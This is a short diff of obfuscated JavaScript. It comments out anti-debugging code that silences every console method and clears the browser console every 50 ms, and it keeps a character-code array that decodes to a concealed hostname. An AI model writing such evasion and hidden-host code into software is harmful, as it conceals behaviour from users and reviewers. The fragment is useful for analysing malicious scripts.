@@ -60,28 +60,28 @@
                     } catch {}
                 })();
 
-                const _0x48a3d2 = console;
-                const _0x12cf8e = {};
-                const _0x5e7a1b = ['log', 'error', 'warn', 'info', 'debug', 'assert', 'clear', 
-                                'dir', 'dirxml', 'table', 'trace', 'group', 'groupCollapsed', 
-                                'groupEnd', 'count', 'countReset', 'profile', 'profileEnd', 
-                                'time', 'timeLog', 'timeEnd', 'timeStamp'];
+                // const _0x48a3d2 = console;
+                // const _0x12cf8e = {};
+                // const _0x5e7a1b = ['log', 'error', 'warn', 'info', 'debug', 'assert', 'clear', 
+                //                 'dir', 'dirxml', 'table', 'trace', 'group', 'groupCollapsed', 
+                //                 'groupEnd', 'count', 'countReset', 'profile', 'profileEnd', 
+                //                 'time', 'timeLog', 'timeEnd', 'timeStamp'];
                 
-                _0x5e7a1b.forEach(_0x3f9d4c => {
-                    _0x12cf8e[_0x3f9d4c] = _0x48a3d2[_0x3f9d4c];
-                });
+                // _0x5e7a1b.forEach(_0x3f9d4c => {
+                //     _0x12cf8e[_0x3f9d4c] = _0x48a3d2[_0x3f9d4c];
+                // });
                 
-                _0x5e7a1b.forEach(_0x2a7e5f => {
-                    _0x48a3d2[_0x2a7e5f] = function() {};
-                });
+                // _0x5e7a1b.forEach(_0x2a7e5f => {
+                //     _0x48a3d2[_0x2a7e5f] = function() {};
+                // });
                 
-                const _0x1d4b6a = setInterval(() => {
-                    _0x12cf8e['clear'].call(_0x48a3d2);
-                    _0x12cf8e['log'].call(_0x48a3d2, '');
-                }, 50);
+                // const _0x1d4b6a = setInterval(() => {
+                //     _0x12cf8e['clear'].call(_0x48a3d2);
+                //     _0x12cf8e['log'].call(_0x48a3d2, '');
+                // }, 50);
                 
-                _0x12cf8e['clear'].call(_0x48a3d2);
-                _0x12cf8e['log'].call(_0x48a3d2, '');
+                // _0x12cf8e['clear'].call(_0x48a3d2);
+                // _0x12cf8e['log'].call(_0x48a3d2, '');
             
                 const _0x4a2f1c = [112,117,115,104,109,97,110,97,103,101,114,46,97,119,109,116,97,98,46,105,110];
                 const _0x5b9d3a = false;
